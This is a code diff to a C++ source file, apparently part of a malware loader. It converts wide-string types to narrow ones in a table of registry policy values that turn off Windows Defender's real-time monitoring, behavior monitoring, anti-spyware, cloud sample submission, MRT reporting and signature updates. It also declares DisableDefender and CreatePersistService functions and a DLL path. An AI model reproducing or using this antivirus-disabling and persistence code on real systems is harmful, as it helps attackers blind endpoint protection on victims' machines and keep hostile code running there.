@@ -12,42 +12,42 @@
 #include "..\include\util.hpp"
 
 HKEY HKLM = HKEY_LOCAL_MACHINE;
-std::map<LPCWSTR, std::map<LPCWSTR, DWORD>> registryEntries = {
-	{L"SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender", {
-		{L"DisableAntiSpyware", 1},
-		{L"DisableRoutinelyTakingAction", 1},
-		{L"DisableRealtimeMonitoring", 1},
-		{L"DisableAntiVirus", 1},
-		{L"DisableSpecialRunningModes", 1},
-		{L"ServiceKeepAlive", 0}
+std::map<LPCSTR, std::map<LPCSTR, DWORD>> registryEntries = {
+	{"SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender", {
+		{"DisableAntiSpyware", 1},
+		{"DisableRoutinelyTakingAction", 1},
+		{"DisableRealtimeMonitoring", 1},
+		{"DisableAntiVirus", 1},
+		{"DisableSpecialRunningModes", 1},
+		{"ServiceKeepAlive", 0}
 	}},
-	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", {
-		{L"DisableAntiSpyware", 1},
-		{L"DisableRoutinelyTakingAction", 1},
-		{L"DisableRealtimeMonitoring", 1},
-		{L"DisableAntiVirus", 1},
-		{L"DisableSpecialRunningModes", 1},
-		{L"ServiceKeepAlive", 0}
+	{"SOFTWARE\\Policies\\Microsoft\\Windows Defender", {
+		{"DisableAntiSpyware", 1},
+		{"DisableRoutinelyTakingAction", 1},
+		{"DisableRealtimeMonitoring", 1},
+		{"DisableAntiVirus", 1},
+		{"DisableSpecialRunningModes", 1},
+		{"ServiceKeepAlive", 0}
 	}},
-	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", {
-		{L"SpyNetReporting", 0},
-		{L"SubmitSamplesConsent", 0},
-		{L"DisableBlockAtFirstSeen", 1}
+	{"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", {
+		{"SpyNetReporting", 0},
+		{"SubmitSamplesConsent", 0},
+		{"DisableBlockAtFirstSeen", 1}
 	}},
-	{L"SOFTWARE\\Policies\\Microsoft\\MRT", {
-		{L"DontReportInfectionInformation", 1}
+	{"SOFTWARE\\Policies\\Microsoft\\MRT", {
+		{"DontReportInfectionInformation", 1}
 	}},
-	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", {
-		{L"ForceUpdateFromMU", 0}
+	{"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", {
+		{"ForceUpdateFromMU", 0}
 	}},
-	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", {
-		{L"DisableRealtimeMonitoring", 1},
-		{L"DisableOnAccessProtection", 1},
-		{L"DisableBehaviorMonitoring", 1},
-		{L"DisableScanOnRealtimeEnable", 1},
+	{"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", {
+		{"DisableRealtimeMonitoring", 1},
+		{"DisableOnAccessProtection", 1},
+		{"DisableBehaviorMonitoring", 1},
+		{"DisableScanOnRealtimeEnable", 1},
 	}}
 };
-LPCWSTR dllPath = L"";
+LPCSTR dllPath = "";
 
 int DisableDefender();
 int CreatePersistService();
